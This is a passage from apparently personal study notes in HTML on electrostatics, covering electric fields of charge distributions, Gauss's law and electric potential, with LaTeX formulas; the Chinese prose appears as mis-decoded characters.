ä¸ä¼šå½±å“åˆ°ç”µåœº, ä¹Ÿå¯ä»¥é€šè¿‡åº“ä»‘å®šç†æ¨å‡º.</p><p>ç”µåœºè¢«å®šä¹‰ä¸º, ä½œç”¨åœ¨ä¸€ä¸ªæå°çš„æ­£ç”µè·ä¸Šçš„åŠ›é™¤ä»¥è¿™ä¸ªç”µè·çš„ç”µè·é‡:<br>$$<br>E &#x3D; \frac{F}{q}<br>$$<br>æ–¹å‘ä¸ºç”µè·å—åˆ°çš„åŠ›çš„æ–¹å‘. å•ä½æ˜¯ N\C .</p><p>å¦ä¸€ä¸ªå¸¸ç”¨çš„å½¢å¼ä¸º:<br>$$<br>E &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{Q}{r^2}<br>$$<br>å¯ä»¥æƒ³, ç”µåœºåŠ›çš„å¤§å°å’Œè·ç¦»æœ‰å…³, è¿™é‡Œè‡ªç„¶ä¹Ÿæ˜¯. éš”å¾—è¿‘, å—åˆ°çš„ç”µåœºåŠ›å¤§, ç”µåœºä¹Ÿå¤§.</p><h2 id="19-7-Electric-Field-Calculations-for-Continuous-Charge-Distributions"><a href="#19-7-Electric-Field-Calculations-for-Continuous-Charge-Distributions" class="headerlink" title="19.7 Electric Field Calculations for Continuous Charge Distributions"></a>19.7 Electric Field Calculations for Continuous Charge Distributions</h2><p>å½¢æˆç”µåœºçš„è¿™ä¸ªç‰©ä½“, æˆ‘ä»¬ä¸€èˆ¬å¯ä»¥çœ‹ä½œæ˜¯ç”µè·å‡åŒ€åˆ†å¸ƒçš„, ç”¨å¾®åˆ†çš„æ–¹å¼å†™ä¸º $dQ$. ç”µåœºå°±æ˜¯:<br>$$<br>dE &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{dQ}{r^2}<br>$$<br>æ€»çš„ç”µåœºå°±æ˜¯:<br>$$<br>E &#x3D; \int dE<br>$$<br>$dE$ æ˜¯ä¸€ä¸ªçŸ¢é‡.</p><h2 id="æ¨¡å‹é¢˜"><a href="#æ¨¡å‹é¢˜" class="headerlink" title="æ¨¡å‹é¢˜"></a>æ¨¡å‹é¢˜</h2><h3 id="Uniformly-charged-ring"><a href="#Uniformly-charged-ring" class="headerlink" title="Uniformly charged ring"></a>Uniformly charged ring</h3><p>ç”µè·åœ¨åœ†ç¯ä¸Šå‡åŒ€åˆ†å¸ƒ, å·²çŸ¥å•ä½é•¿åº¦çš„ç”µè·å¯†åº¦ $\lambda$, æ±‚è½´çº¿ä¸Šçš„ç”µåœºå¤§å°.</p><p>å…ˆæ±‚ $dQ$ å½¢æˆçš„ç”µåœº, å†æ±‚ç§¯åˆ†.<br><img src="/../img/E_ring.png"><br>ç»éªŒ:</p><ul><li>åˆ©ç”¨å¯¹ç§°æ€§å‡è½»è®¡ç®—çš„å¤æ‚ç¨‹åº¦</li><li>ç”¨ charge density æ¥è¡¨ç¤º $dQ$ </li><li>å¯¹ r çš„èŒƒå›´ä½œå‡ºåˆ¤æ–­</li></ul><h3 id="A-line-of-charge"><a href="#A-line-of-charge" class="headerlink" title="A line of charge"></a>A line of charge</h3><p>å…ˆæ±‚ä¸€å°æ®µ $dy$ å½¢æˆçš„ç”µåœº, å†æ±‚ç§¯åˆ†<br><img src="/../img/E_stick.png"></p><h3 id="Uniformly-charged-disk"><a href="#Uniformly-charged-disk" class="headerlink" title="Uniformly charged disk"></a>Uniformly charged disk</h3><p>å·²çŸ¥çš„æ˜¯ç”µè·å¯†åº¦ $\sigma$ å•ä½æ˜¯ $C&#x2F;m^2$.</p><p>å…ˆç®—å‡ºåœ†ç¯å½¢æˆçš„ç”µåœº, å†é€šè¿‡ç§¯åˆ†.<br><img src="/../img/E_disk.png"><br>è¿™é‡Œå¾—åˆ°çš„ä¸€ä¸ªç»“è®ºä¸º, å¦‚æœåœ†ç›˜çš„åŠå¾„ç‰¹åˆ«å¤§, æ— ç©·å¤§, é‚£ä¹ˆ:<br>$$<br>E &#x3D; \frac{\sigma}{2 \epsilon_0}<br>$$</p><h3 id="A-plane-of-charge"><a href="#A-plane-of-charge" class="headerlink" title="A plane of charge"></a>A plane of charge</h3><p>ä¸¤ä¸ª plates ä¹‹é—´çš„è·ç¦» d éå¸¸å°. ç”¨ä¸Šé¢çš„ç»“è®º.<br>$$<br>E &#x3D; \frac{\sigma}{2 \epsilon_0}<br>$$<br><img src="/../img/E_plates.png"><br>å†…éƒ¨ä¸ºä¸¤å€, å¤–éƒ¨ä¸ºé›¶.</p><h2 id="19-8-Field-Lines"><a href="#19-8-Field-Lines" class="headerlink" title="19.8 Field Lines"></a>19.8 Field Lines</h2><p>ç”µåœºçº¿çš„æ–¹å‘ä¸º positive test charge çš„å—åŠ›æ–¹å‘.</p><p>ä¹Ÿå°±æ˜¯è¯´, ä¸€ä¸ªå¸¦ç”µç‰©ä½“äº§ç”Ÿçš„ç”µåœºä½œç”¨äºå¤–é¢ä¸€ä¸ª positive test charge, è¿™ä¸ª charge å—åŠ›çš„æ–¹å‘å°±æ˜¯ç”µåœºçº¿çš„æ–¹å‘.</p><p>ç”µåœºçº¿çš„å¯†é›†ç¨‹åº¦å¯ä»¥åæ˜ ç”µåœºçš„å¤§å°.</p><p>ç”µåœºçº¿ä¸ä¼šç›¸äº¤.</p><h2 id="19-9-ç”µåœºå’Œå¯¼ä½“-Electric-Field-and-Conductors"><a href="#19-9-ç”µåœºå’Œå¯¼ä½“-Electric-Field-and-Conductors" class="headerlink" title="19.9 ç”µåœºå’Œå¯¼ä½“ Electric Field and Conductors"></a>19.9 ç”µåœºå’Œå¯¼ä½“ Electric Field and Conductors</h2><p>å¯¼ä½“å†…éƒ¨çš„ç”µåœºå§‹ç»ˆä¸ºé›¶, ä¸è®ºæ˜¯å®å¿ƒè¿˜æ˜¯ç©ºå¿ƒ, è‹¥å†…éƒ¨çš„ä¸€ä¾§å¸¦ç”µ, é‚£ä¹ˆç”µå­ä¼šç§»åŠ¨åˆ°ç›¸å¯¹çš„ä¸€ä¾§å¹¶å°†å…¶æŠµæ¶ˆ.</p><p>å¯¼ä½“çš„ç”µæ€§éƒ½æ˜¯è¡¨ç°åœ¨è¡¨é¢. any net charge on a conductors distributes itself on the surface.<br><img src="/../img/inside_is_zero.png"></p><p>å¯¼ä½“å†…éƒ¨çš„ç”µåœºä¸ºé›¶ (å¯ä»¥è¿™æ ·æƒ³, å¤–é¢æœ‰ç”µåœºæ—¶, å†…éƒ¨å½¢æˆçš„ç”µåœº, å…¶å’Œå¤–éƒ¨ç”µåœºå¤§å°ç›¸ç­‰æ–¹å‘ç›¸å, å°±æŠµæ¶ˆäº†, æ­¤æ—¶ä¸ºé›¶, è€Œå½“å¯¼ä½“ä¸å¤„äºç”µåœºä¸­æ—¶, å…¶æœ¬èº«ç”µåœºå°±ä¸ºé›¶)</p><p>å½“ä¸€ä¸ªå¯¼ä½“å¤„äºä¸€ä¸ªç”µåœºä¸­æ—¶, å¦‚:<br><img src="/../img/inside_zero.png"></p><p>è¿™ä¸ªå¯¼ä½“è¡¨ç°å‡ºæ¥çš„æ˜¯ç”µåœºä¸ºé›¶, å› ä¸ºå†…éƒ¨å½¢æˆçš„ç”µåœºä¼šå’Œå¤–éƒ¨çš„æŠµæ¶ˆ.</p><h2 id="19-10-å¸¦ç”µç²’å­åœ¨ç”µåœºä¸­çš„ç§»åŠ¨-Motion-of-Charged-Particle-in-an-Electric-Field"><a href="#19-10-å¸¦ç”µç²’å­åœ¨ç”µåœºä¸­çš„ç§»åŠ¨-Motion-of-Charged-Particle-in-an-Electric-Field" class="headerlink" title="19.10 å¸¦ç”µç²’å­åœ¨ç”µåœºä¸­çš„ç§»åŠ¨ Motion of Charged Particle in an Electric Field"></a>19.10 å¸¦ç”µç²’å­åœ¨ç”µåœºä¸­çš„ç§»åŠ¨ Motion of Charged Particle in an Electric Field</h2><p>è¿˜æ˜¯é«˜ä¸­çš„é‚£ä¸€å¥—:<br><img src="/../img/motion_particle.png"></p><p>$$<br>F &#x3D; qE, \newline<br>a &#x3D; \frac{F}{m} &#x3D; \frac{qE}{m}, \newline<br>v &#x3D; \sqrt{2ax}<br>$$</p><h2 id="19-11-Electric-Dipoles"><a href="#19-11-Electric-Dipoles" class="headerlink" title="19.11 Electric Dipoles"></a>19.11 Electric Dipoles</h2><p>Electric Dipoles æ˜¯å¤§å°ç›¸ç­‰, ç”µæ€§ç›¸å, ä¹‹é—´æœ‰ä¸€æ®µè·ç¦» l çš„ä¸¤ä¸ªå¸¦ç‚¹ç²’å­.<br><img src="/../img/electric_dipole.png"></p><p>$Ql$ è¢«ç§°ä½œ dipole moment, ç”¨ç¬¦å· p è¡¨ç¤º, æ˜¯ä¸€ä¸ªçŸ¢é‡ (æ¯•ç«Ÿæ˜¯ moment).</p><p>å«æœ‰ electric dipole çš„åˆ†å­å¦‚ CO è¢«ç§°ä½œ polar molecules.</p><h3 id="Dipole-in-an-External-Field"><a href="#Dipole-in-an-External-Field" class="headerlink" title="Dipole in an External Field"></a>Dipole in an External Field</h3><p><img src="/../img/dipole_in_external_field.png"></p><p>ç”µåœºåˆ†å¸ƒå‡åŒ€, è¿™é‡Œ dipole å—åˆ°çš„åˆå¤–åŠ›å°±ä¸º 0. ä½†æ˜¯æœ‰ torque ä½œç”¨åœ¨ä¸Šé¢:<br>$$<br>\tau &#x3D; QE \frac{l}{2} sin\theta + QE \frac{l}{2} sin\theta &#x3D; pE sin\theta<br>$$<br>è¿™é‡Œçš„ $pE sin\theta$ å°±å¯ä»¥å†™æˆå‰ä¹˜çš„å½¢å¼:</p><p>$$<br>\tau &#x3D; p \times E<br>$$</p><p>è½¬åŠ¨ç³»åšçš„åŠŸå°±æ˜¯åŠ›çŸ©ä¹˜ä»¥æ—‹è½¬çš„è§’åº¦:</p><p>$$<br>W &#x3D; \int_{\theta 1}^{\theta 2} \tau d\theta<br>$$</p><h1 id="Chapter-20-Gaussâ€™s-Law"><a href="#Chapter-20-Gaussâ€™s-Law" class="headerlink" title="Chapter 20 Gaussâ€™s Law"></a>Chapter 20 Gaussâ€™s Law</h1><p>é«˜æ–¯å®šç†æ˜¯ç”¨æ¥æè¿° electric charge å’Œ electric field çš„å…³ç³»çš„.</p><p>é«˜æ–¯å®šç†æ˜¯ Coulombâ€™s law çš„ä¸€ç§æ›´ general çš„å½¢å¼.</p><h2 id="20-1-Electric-Flux"><a href="#20-1-Electric-Flux" class="headerlink" title="20.1 Electric Flux"></a>20.1 Electric Flux</h2><p>$\phi$ å¯ä»¥çœ‹ä½œæ˜¯å‚ç›´ç©¿è¿‡çš„ç”µåœºçº¿çš„æ€»æ¡æ•°.</p><p>Electric Flux çš„å®šä¹‰ä¸º:<br>$$<br>\phi_E &#x3D; EA<br>$$<br>E æ˜¯ç”µåœºå¼ºåº¦ (å¯ä»¥çœ‹ä½œæ˜¯ç”µåœºçº¿çš„å¯†åº¦), A æ˜¯å¹³é¢çš„é¢ç§¯. (å› æ­¤å¯ä»¥ç†è§£ä¸º, ç”µåœºçº¿çš„é¢å¯†åº¦ä¹˜ä»¥é¢ç§¯, å°±å¾—åˆ°äº†ç”µåœºçº¿çš„æ€»æ¡æ•°)</p><p>ç”±äºæ˜¯è¦å‚ç›´ç©¿è¿‡, è€Œç”µåœºå’Œé¢ä¸ä¸€å®šå‚ç›´, å¦‚:<br><img src="/../img/flux_perpenticular.png"><br>æ‰€ä»¥è¿™æ ·å†™:<br>$$<br>\phi_E &#x3D; EA_T &#x3D; EAcos\theta<br>$$<br>çœ‹åˆ° $cos\theta$ æˆ‘ä»¬å¯ä»¥å†™ä¸ºç‚¹ä¹˜çš„å½¢å¼:<br>$$<br>\phi_E &#x3D; E \cdot A<br>$$<br>æ”¹æˆç‚¹ä¹˜åè¦æ³¨æ„, è¿™é‡Œçš„ $A$ æ˜¯ vector äº†. æ–¹å‘æ˜¯å‚ç›´äºå¹³é¢. ä¸ºä»€ä¹ˆè¿™é‡Œæ˜¯å‚ç›´ä¸å¹³é¢?</p><p>å› ä¸ºæœ€ç»ˆæ±‚çš„æ˜¯ $\phi$, å…¶å‚ç›´äºå¹³é¢, è¿™é‡Œå°± <mark>è§„å®š</mark> A æ˜¯å‚ç›´äºå¹³é¢çš„, è¿™æ—¶åˆå¯ä»¥å¾—åˆ° $\theta$, å°±æœ‰ $Ecos\theta$ ä¹Ÿæ˜¯å‚ç›´äºå¹³é¢.</p><p>ä¸Šé¢çš„å…¬å¼è€ƒè™‘çš„æ˜¯ç”µåœºåˆ†å¸ƒå‡åŒ€çš„æƒ…å†µ. å½“ä¸å‡åŒ€, æˆ‘ä»¬å°±ç”¨åˆ°ç§¯åˆ†çš„çŸ¥è¯†:<br>$$<br>\phi_E \approx \sum_{i&#x3D;1}^{n}E_i \cdot \Delta A_i<br>$$</p><p>ä¹Ÿå°±æ˜¯:<br>$$<br>\phi_E &#x3D; \int E \cdot dA<br>$$</p><p>å¾ˆå¤šæƒ…å†µä¸‹, æˆ‘ä»¬è®¡ç®—çš„éƒ½æ˜¯ closed surface çš„ flux, å¦‚:<br><img src="/../img/closed_surface.png"></p><p>å› æ­¤åˆå¯ä»¥å†™æˆé—­åˆæ›²çº¿ç§¯åˆ†çš„å½¢å¼:<br>$$<br>\phi_E &#x3D; \oint E \cdot dA<br>$$<br>E å’Œ $dA$ ä¹‹é—´çš„è§’åº¦ $\theta$ çš„å€¼å°äº $\frac{\pi}{2}$.</p><p>ä¸€èˆ¬è§„å®šç”µåœºçº¿ outward ä¸ºæ­£, entering ä¸ºè´Ÿ.</p><p>åªè¦å°é—­çš„æ›²çº¿å†…éƒ¨æ²¡æœ‰ç”µè·, é‚£ä¹ˆæ€»çš„ flux å°±ä¸º 0 (è¿›æ¥äº†åˆå‡ºå»).</p><p>å†…éƒ¨æœ‰ç”µè·, flux å°±ä¸ä¼šä¸ºé›¶, å¦‚:<br><img src="/../img/charge_inside.png"></p><p>ä¸ºä»€ä¹ˆå« flux?</p><p>â€œfluxâ€ è¿™ä¸ªè¯æ¥æºäºæ‹‰ä¸è¯­ â€œflowâ€. ä¹Ÿå°±æ˜¯çœ‹ä½œ fluid flow.</p><h2 id="20-2-é«˜æ–¯å®šç†-Gaussâ€™s-Law"><a href="#20-2-é«˜æ–¯å®šç†-Gaussâ€™s-Law" class="headerlink" title="20.2 é«˜æ–¯å®šç† Gaussâ€™s Law"></a>20.2 é«˜æ–¯å®šç† Gaussâ€™s Law</h2><p>å…¬å¼å†…å®¹:<br>$$<br>\oint E \cdot dA &#x3D; \frac{Q_{encl}}{\epsilon_0}<br>$$<br>è¿™é‡Œçš„ $Q_{encl}$ è¡¨ç¤ºçš„æ˜¯ enclosed çš„ç”µè·é‡.</p><p>å› ä¸ºé«˜æ–¯å®šç†é€‚ç”¨äºä»»ä¸€ surface (åªè¦èƒ½æŠŠå†…éƒ¨çš„ç”µè·åŒ…è£¹èµ·æ¥å°±å¯ä»¥äº†, æ¯•ç«Ÿè®¡ç®—çš„æ˜¯ $\phi$ æ˜¯ç”µåœºçº¿çš„æ•°é‡, æ•°é‡è‡ªç„¶å’Œ surface æ²¡æœ‰å…³ç³»), å°±é€‰å–ä¸€ä¸ªæœ€å®¹æ˜“è®¡ç®—çš„é«˜æ–¯é¢ (ä¸€èˆ¬æ˜¯çƒ). å¦‚:<br><img src="/../img/guass_surface_sphere.png"></p><p>ç„¶åå°±æœ‰è¿™æ ·çš„æ¨å¯¼:<br>$$<br>\oint E \cdot dA &#x3D; \oint E dA &#x3D; E \oint dA &#x3D; E(4\pi r^2)<br>$$<br>ä¸ºä»€ä¹ˆèƒ½ç›´æ¥å°† $E \cdot dA$ å†™æˆ $EdA$ ?</p><p>ä»çƒå¿ƒåˆ°çƒé¢çš„è¿çº¿å³åŠå¾„æ˜¯å‚ç›´äº surface çš„, è§ä¸Šå›¾, ç”µåœºæ–¹å‘å’Œ surface å‚ç›´æ–¹å‘ç›¸åŒ.</p><p>æˆ‘ä»¬çŸ¥é“:<br>$$<br>E &#x3D; \frac{1}{4\pi \epsilon_0} \frac{Q}{r^2}<br>$$</p><p>å°±å¯ä»¥å¾—åˆ°:<br>$$<br>E(4\pi r^2) &#x3D; \frac{Q}{\epsilon_0}<br>$$</p><p>ä¹Ÿå°±æ¨å‡ºäº†é«˜æ–¯å®šç†.</p><p>æœ€å:<br>$$<br>\oint E \cdot dA &#x3D; \oint \frac{1}{4\pi \epsilon_0} \frac{Q}{r^2} dA &#x3D; \frac{Q}{4\pi \epsilon_0 r^2}(4 \pi r^2) &#x3D; \frac{Q}{\epsilon_0}<br>$$</p><p>ä¸ºä»€ä¹ˆèƒ½ç”¨ç†æƒ³çš„çƒæ¨å‡ºæ¥çš„é«˜æ–¯å…¬å¼è®¡ç®—ä¸è§„åˆ™å›¾å½¢ ?<br><img src="/../img/irregular.png"></p><p>çœ‹å›¾å¯çŸ¥, æ—¢ç„¶é€šè¿‡çš„ç”µåœºçº¿çš„æ¡æ•°ç›¸åŒ, ç”¨çƒè®¡ç®—å‡ºæ¥çš„ä¹Ÿå°±å’Œä¸è§„åˆ™å›¾å½¢çš„ç›¸åŒ.</p><p>Coulombâ€™s Law ä¸èƒ½æè¿°ç”±å˜åŒ–çš„ç£åœºäº§ç”Ÿçš„ç”µåœº. ä½†æ˜¯ Gaussâ€™s Law é€‚ç”¨äºä»»ä½•åœºæ™¯.</p><h2 id="20-3-é«˜æ–¯å®šç†çš„åº”ç”¨-Application-of-Gaussâ€™s-Law"><a href="#20-3-é«˜æ–¯å®šç†çš„åº”ç”¨-Application-of-Gaussâ€™s-Law" class="headerlink" title="20.3 é«˜æ–¯å®šç†çš„åº”ç”¨ Application of Gaussâ€™s Law"></a>20.3 é«˜æ–¯å®šç†çš„åº”ç”¨ Application of Gaussâ€™s Law</h2><p>ä¸ºä»€ä¹ˆè¯´é«˜æ–¯å®šç†æ˜¯æè¿° electric charge å’Œ electric field çš„å…³ç³» ?</p><p>çœ‹å…¬å¼å°±çŸ¥é“,<br>$$<br>\oint E \cdot dA &#x3D; \frac{Q_{encl}}{\epsilon_0}<br>$$</p><p>å·¦ä¾§æ˜¯ electric field, å³ä¾§æ˜¯ electric charge.</p><p>ä¸€èˆ¬è€ƒè™‘ surface ä¸ºå¯¹ç§°çš„, è¿™æ · E æ‰ä¼šæ˜¯ constant æˆ–è€…åœ¨éƒ¨åˆ†è¡¨é¢æ˜¯å‡åŒ€çš„.</p><p>é‡ç‚¹åœ¨äºè®¡ç®—å‡º $Q_{encl}$ çš„å€¼.</p><h3 id="å…¸å‹é¢˜"><a href="#å…¸å‹é¢˜" class="headerlink" title="å…¸å‹é¢˜"></a>å…¸å‹é¢˜</h3><h4 id="Spherical-conductor"><a href="#Spherical-conductor" class="headerlink" title="Spherical conductor"></a>Spherical conductor</h4><p>è¿™ç§é¢˜, æ˜¯å¯¼ä½“, ä¸ç®¡æ˜¯ç©ºå¿ƒè¿˜æ˜¯å®å¿ƒ, éƒ½æ˜¯ä¸€æ ·çš„ç»“æœ, å¤–éƒ¨æœ‰ç”µåœº, å†…éƒ¨ç”µåœºä¸ºé›¶:<br><img src="/../img/spherical_conductor.png"></p><p>æ±‚å¤–ç”µåœº, ä¸»è¦å°±æ˜¯é€‰å–é«˜æ–¯é¢, $r &gt; r_0$, $r_0$ æ˜¯å¯¼ä½“çš„åŠå¾„.</p><p>é€‰å–çš„é«˜æ–¯é¢è¦åŒ…è£¹ä½åŸæ¥çš„å¯¼ä½“, å…¶å†…éƒ¨çš„ $Q_{encl}$ å°±æ˜¯å¯¼ä½“æ‰€å¸¦çš„ç”µè·é‡.</p><h4 id="Solid-sphere-of-charge"><a href="#Solid-sphere-of-charge" class="headerlink" title="Solid sphere of charge"></a>Solid sphere of charge</h4><p>è¿™ç§æ˜¯éå¯¼ä½“, ä½†æ˜¯ç”µè·åˆ†å¸ƒå‡åŒ€, è®¡ç®—å¤–éƒ¨çš„ç”µåœºåŒæ ·æ˜¯ç›´æ¥é€‰å– $r &gt; r_0$ çš„é«˜æ–¯é¢.</p><p>è®¡ç®—å†…éƒ¨çš„ç”µåœºæ—¶, éœ€è¦ä½¿ç”¨ charge density $\rho_E$, ä¸”é€‰å–çš„é«˜æ–¯é¢ $r &lt; r_0$:<br><img src="/../img/solid_spere.png"></p><h4 id="Long-uniform-line-of-charge"><a href="#Long-uniform-line-of-charge" class="headerlink" title="Long uniform line of charge"></a>Long uniform line of charge</h4><p>é¢˜ç›®å¦‚ä¸‹:<br><img src="/../img/long_uniform_line_of_charge.png"></p><p>ä¹¦ä¸­çš„è®¡ç®—å…¬å¼:<br>$$<br>\oint E \cdot dA &#x3D; E(2\pi rl) &#x3D; \frac{Q_{encl}}{\epsilon_0} &#x3D; \frac{\lambda l}{\epsilon_0}<br>$$<br>ä¸ºä½•å…¬å¼ä»ç„¶é€‚ç”¨ ? å¹¶æ²¡æœ‰ç”¨çƒå½¢çš„é«˜æ–¯é¢ ?</p><p>æš‚æ—¶ä¸æ¸…æ¥š, (å¯èƒ½æ˜¯å’Œ Coulombâ€™s law ä¸­çš„ k çš„æ¨å¯¼æœ‰å…³, é‚£ä¹ˆ k å’Œ $\epsilon_0$ çš„å…³ç³»æ˜¯å¦‚ä½•æ¨å¯¼çš„) ä¼¼ä¹éƒ½èƒ½ç”¨è¿™ä¸ªå¼å­è®¡ç®—. é€‰å–çš„é«˜æ–¯é¢, ç”µåœºçº¿æœ€å¥½å‚ç›´äº surface.</p><h4 id="Infinite-plane-of-charge"><a href="#Infinite-plane-of-charge" class="headerlink" title="Infinite plane of charge"></a>Infinite plane of charge</h4><p>é¢˜ç›®å¦‚ä¸‹:<br><img src="/../img/infinite_plane_of_charge.png"></p><p>è¿™é‡Œé€‰å–çš„é«˜æ–¯é¢æ˜¯ä¸Šä¸‹ä¸¤ä¸ªå¹³é¢.</p><h4 id="Electric-field-near-any-conducting-surface"><a href="#Electric-field-near-any-conducting-surface" class="headerlink" title="Electric field near any conducting surface"></a>Electric field near any conducting surface</h4><p>é¢˜ç›®å¦‚ä¸‹:<br><img src="/../img/electric_field_near_any_conducting_surface.png"></p><p>åŒæ ·æ˜¯ç›´æ¥åº”ç”¨é«˜æ–¯å®šç†, å·²çŸ¥ surface charge density ä¸º $\sigma$:<br>$$<br>\oint E \cdot dA &#x3D; EA &#x3D; \frac{Q_{encl}}{\epsilon_0} &#x3D; \frac{\sigma A}{\epsilon_0}<br>$$</p><p>æœ€ç»ˆå¾—åˆ°:<br>$$<br>E &#x3D; \frac{\sigma}{\epsilon_0}<br>$$</p><h1 id="Chapter-21-ç”µåŠ¿èƒ½-Electric-Potential"><a href="#Chapter-21-ç”µåŠ¿èƒ½-Electric-Potential" class="headerlink" title="Chapter 21 ç”µåŠ¿èƒ½ Electric Potential"></a>Chapter 21 ç”µåŠ¿èƒ½ Electric Potential</h1><h2 id="21-1-Electric-Potential-and-Potential-Difference"><a href="#21-1-Electric-Potential-and-Potential-Difference" class="headerlink" title="21.1 Electric Potential and Potential Difference"></a>21.1 Electric Potential and Potential Difference</h2><p>Potential energy can be defined only for a conservatice force.</p><p>Conservative force åšçš„åŠŸå’Œè·¯å¾„æ— å…³, ä¸è·ç¦»ç›¸å…³.</p><p>å®šä¹‰ potential energy ä¸º U.</p><p>å®šä¹‰çš„ $U_b - U_a$ æ˜¯ä» a ç§»åŠ¨åˆ° b. ä¸ºä»€ä¹ˆ ?<br>å¯ä»¥ç†è§£ä¸ºä»¥å‰è®°å¿†çš„ <mark>æœ«å‡åˆ</mark> å°±èƒ½å¾—åˆ°ä¸­é—´çš„å˜åŒ–é‡. </p><p>ä¸ºä»€ä¹ˆç”µåœºåŠ›åšæ­£åŠŸ, potential energy å‡å° ?<br>ä¹Ÿå°±æ˜¯è¯´è½¬æ¢æˆäº†å…¶ä»–çš„èƒ½é‡. æ¯”å¦‚ç”µåœºåŠ›ä½œæ­£åŠŸæ—¶ç»™ç²’å­åŠ é€Ÿ, åŠ¨èƒ½å¢å¤§, åŠ¿èƒ½å‡å°‘.</p><p>å®šä¹‰ electric potential (ç”µåŠ¿) ä¸º potential energy per unit charge:<br>$$<br>V_a &#x3D; \frac{U_a}{q}<br>$$</p><p><mark>åªæœ‰ç”µåŠ¿å·®æœ‰ç‰©ç†å«ä¹‰</mark> </p><p>å¸¸ç”¨çš„å…¬å¼:<br>$$<br>V_{ba} &#x3D; V_b - V_a &#x3D; \frac{U_b - U_a}{q} &#x3D; - \frac{W_{ba}}{q}<br>$$</p><p>ç”µåŠ¿çš„å•ä½æ˜¯ç”µå‹ volt:<br>$$<br>1V &#x3D; 1 J&#x2F;C<br>$$</p><p>å¸¸å¸¸æŠŠåœ°é¢æˆ–è¿æ¥åˆ°åœ°é¢çš„å¯¼ä½“è§†ä¸ºç”µåŠ¿ä¸ºé›¶.<br>$$<br>U_b - U_a &#x3D; q(V_b - V_a) &#x3D; qV_{ba}<br>$$<br>ç”µè·ç»è¿‡ $V_{ba}$ ç”µåŠ¿ä¹‹åçš„åŠ¿èƒ½å˜åŒ–é‡ä¸º $qV_ba$.</p><p>ä¸€ä¸ªç±»æ¯”:<br><img src="/../img/analogy_gravity_electric.png"></p><p>åœ¨ç›¸åŒçš„é«˜åº¦, é‡é‡è¶Šå¤§çš„ç‰©ä½“, å…¶é‡åŠ›åŠ¿èƒ½è¶Šå¤§ (mgh).<br>åœ¨ç›¸åŒç”µåŠ¿çš„ä½ç½®, ç”µè·é‡è¶Šå¤§, ç”µåŠ¿èƒ½ä¹Ÿè¶Šå¤§ ($qV_{ba}$.</p><h2 id="21-2-Relation-Between-Electric-Potential-and-Electric-Field"><a href="#21-2-Relation-Between-Electric-Potential-and-Electric-Field" class="headerlink" title="21.2 Relation Between Electric Potential and Electric Field"></a>21.2 Relation Between Electric Potential and Electric Field</h2><p>$$<br>\because U_b - U_a &#x3D; - w_{ba} &#x3D; - \int_a^b F \cdot dl<br>$$</p><p>$$<br>V_ba &#x3D; V_b - V_a &#x3D; \frac{U_b - U_a}{q} &#x3D; - \int_a^b \frac{F}{q} \cdot dl &#x3D; - \int_a^b E \cdot dl &#x3D; -E \int_a^b dl &#x3D; -Ed<br>$$</p><h3 id="ç±»å‹é¢˜"><a href="#ç±»å‹é¢˜" class="headerlink" title="ç±»å‹é¢˜"></a>ç±»å‹é¢˜</h3><h4 id="Charge-conducting-sphere"><a href="#Charge-conducting-sphere" class="headerlink" title="Charge conducting sphere"></a>Charge conducting sphere</h4><p><img src="/../img/charged_conducting_sphere.png"></p><p>æ±‚å¤–éƒ¨ç”µåœº E åŒæ ·ç”¨åˆ°é«˜æ–¯å®šç†, å†…éƒ¨ç”µåœºä¸º 0.</p><h4 id="Breakdown-voltage"><a href="#Breakdown-voltage" class="headerlink" title="Breakdown voltage"></a>Breakdown voltage</h4><p>åœ¨ high voltages ä¸‹, ç©ºæ°”ä¼šè¢«ç”µç¦»å½¢æˆç”µåœº. è¢«åŠ é€Ÿçš„ç”µå­ä¼šç¢°æ’ $O_2$ å’Œ $N_2$, ä½¿å¾—æ›´å¤šçš„ç”µå­è¢«æ’å‡º, è¿™æ—¶ç©ºæ°”å˜æˆäº†å¯¼ä½“, æœ‰ç”µæµæµåŠ¨.</p><p><img src="/../img/breakdown_voltage.png"></p><p>åˆ©ç”¨ä¸Šä¸€é“é¢˜å¾—åˆ°çš„ç»“è®º:<br>$$<br>V &#x3D; \frac{1}{4\pi \epsilon_0} \frac{Q}{r_0}, E &#x3D; \frac{1}{4\pi \epsilon_0} \frac{Q}{r_0^2}<br>$$</p><p>å¯ä»¥å¾—åˆ°:<br>$$<br>V &#x3D; r_0 E<br>$$</p><h2 id="21-3-Electric-Potential-Due-to-Point-Charges"><a href="#21-3-Electric-Potential-Due-to-Point-Charges" class="headerlink" title="21.3 Electric Potential Due to Point Charges"></a>21.3 Electric Potential Due to Point Charges</h2><p>ä¸»è¦å°±æ˜¯è¿™ä¸ªå…¬å¼:</p><p>$$<br>V &#x3D; \frac{1}{4\pi \epsilon_0} \frac{Q}{r}<br>$$</p><p>æ¨å¯¼è¿‡ç¨‹å°±æ˜¯:<br>$$<br>V_b - V_a &#x3D; - \int_{r_a}^{r_b} E \cdot dl &#x3D; - \frac{Q}{4\pi \epsilon_0} \int_{r_a}^{r_b} \frac{1}{r^2} dr &#x3D; \frac{1}{4\pi \epsilon_0}( \frac{Q}{r_b} - \frac{Q}{r_a})<br>$$<br>ç”¨æ¥è®¡ç®—è¿™ç§, ç”±ä¸€ä¸ªå¸¦ç”µç‰©ä½“äº§ç”Ÿçš„ç”µåœº, è·ç¦» r å¤„çš„ç”µåŠ¿:<br><img src="/../img/divergence_electric_field.png"></p><p>æˆ‘ä»¬å¯ä»¥æŠŠäº§ç”Ÿç”µåœºçš„æ­£ç”µè·æ‰€åœ¨ä½ç½®ç”µåŠ¿è§†ä¸ºæ— é™å¤§ ($\infty$), æŠŠæ— ç©·è¿œå¤„çš„ç”µåŠ¿è§†ä¸º 0.</p><p>ç”µè·åˆ†å¸ƒå‡åŒ€çš„çƒä½“å¤–éƒ¨ç”µåœºå¼ºåº¦éƒ½ç›¸åŒ.</p><h3 id="ä¹ é¢˜-21-6"><a href="#ä¹ é¢˜-21-6" class="headerlink" title="ä¹ é¢˜ 21-6"></a>ä¹ é¢˜ 21-6</h3><p><img src="/../img/move_charge.png"></p><p>è®°ä½, ç”µåŠ¿æ˜¯ $J &#x2F; C$ å°±è¡Œ.</p><h3 id="ä¹ é¢˜-21-7"><a href="#ä¹ é¢˜-21-7" class="headerlink" title="ä¹ é¢˜ 21-7"></a>ä¹ é¢˜ 21-7</h3><p>ä¸€ä¸ªç‚¹å¤„çš„ç”µåŠ¿æ¥è‡ªäºä¸¤ä¸ªç”µè·. 